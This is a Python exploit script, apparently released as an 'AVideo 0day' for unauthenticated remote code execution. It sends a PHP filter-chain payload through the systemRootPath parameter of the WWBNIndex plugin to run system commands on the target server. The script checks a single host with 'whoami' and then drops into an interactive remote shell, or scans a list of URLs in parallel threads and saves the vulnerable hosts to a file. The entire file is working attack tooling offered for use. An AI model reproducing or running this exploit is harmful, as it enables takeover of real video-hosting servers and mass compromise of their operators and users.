import re
import requests
import argparse

from rich.console import Console
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from php_filter_chain import PHPFilterChainGenerator
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


class AVideoExploit:
    def __init__(self, base_url):
        self.console = Console()
        self.base_url = base_url

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        self.console.print(
            f"[bold {header_colors.get(header, 'white')}][{header}][/bold {header_colors.get(header, 'white')}] {message}"
        )

    def generate_php_filter_payload(self, command):
        generator = PHPFilterChainGenerator()
        return generator.generate_filter_chain(command)

    def send_payload(self, payload):

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            response = requests.post(
                f"{self.base_url}/plugin/WWBNIndex/submitIndex.php",
                data={"systemRootPath": payload},
                headers=headers,
                verify=False,
                timeout=10,
            )
            if response.status_code == 200:
                return response.text
            else:
                return False
        except requests.exceptions.RequestException as e:
            return False

    def parse_output(self, output):
        match = re.search(r"\[S\](.*?)\[E\]", output, re.DOTALL)
        if match:
            return match.group(1).strip()
        else:
            return None

    def interactive_shell(self):
        session = PromptSession(history=InMemoryHistory())
        while True:
            try:
                cmd = session.prompt(
                    HTML("<ansiyellow><b>$ </b></ansiyellow>"), default=""
                ).strip()
                if cmd.lower() == "exit":
                    break
                if cmd.lower() == "clear":
                    self.console.clear()
                    continue

                php_code = f"<?php echo '[S]';system('{cmd}');echo '[E]';?>"
                payload = self.generate_php_filter_payload(php_code)
                output = self.send_payload(payload)

                if output:
                    clean_output = self.parse_output(output)
                    if clean_output:
                        print(f"{clean_output}\n")
                    else:
                        self.custom_print(
                            "No command output returned or error occurred.", "-"
                        )
                else:
                    self.custom_print(
                        "Failed to receive response from the server.", "-"
                    )

            except KeyboardInterrupt:
                self.custom_print("Exiting interactive shell...", "!")
                break

    def check_single_url(self, url):
        php_code = f"<?php echo '[S]';system('whoami');echo '[E]';?>"
        payload = self.generate_php_filter_payload(php_code)
        result = self.send_payload(payload)
        if result:
            clean_output = self.parse_output(result)
            if clean_output:
                return f"{url} is vulnerable, Command output: {clean_output}\n"
        return None

    def check_urls_and_write_output(self, urls, max_workers, output_path):
        def process_url(url):
            avideo_instance = AVideoExploit(url)
            return avideo_instance.check_single_url(url)

        with ThreadPoolExecutor(max_workers=max_workers) as executor, alive_bar(
            len(urls), enrich_print=False
        ) as bar:
            futures = {executor.submit(process_url, url): url for url in urls}
            vulnerable_urls = []
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.custom_print(result, "+")
                    vulnerable_urls.append(result)

                    if output_path:
                        with open(output_path, "a") as file:
                            file.write(result)

                bar()

        if output_path:
            print(f"Results written to {output_path}")


def main():
    parser = argparse.ArgumentParser(
        description="AVideo 0day - Unauthenticated Remote Code Execution"
    )
    parser.add_argument("-u", "--url", help="Base URL for single target", default=None)
    parser.add_argument(
        "-f", "--file", help="File containing list of URLs", default=None
    )
    parser.add_argument(
        "-t", "--threads", help="Number of threads to use", type=int, default=20
    )
    parser.add_argument(
        "-o", "--output", help="Output file to save results", default=None
    )

    args = parser.parse_args()

    if not args.url and not args.file:
        print(
            "Error: No URL or file provided. Use -u to specify a single URL or -f to specify a file containing URLs."
        )
        return

    avideo = AVideoExploit(args.url)

    if args.url:
        output = avideo.check_single_url(args.url)
        if output:
            avideo.custom_print(output, "+")
            avideo.interactive_shell()
    elif args.file:
        with open(args.file, "r") as f:
            urls = f.read().splitlines()
            avideo.check_urls_and_write_output(urls, args.threads, args.output)


if __name__ == "__main__":
    main()
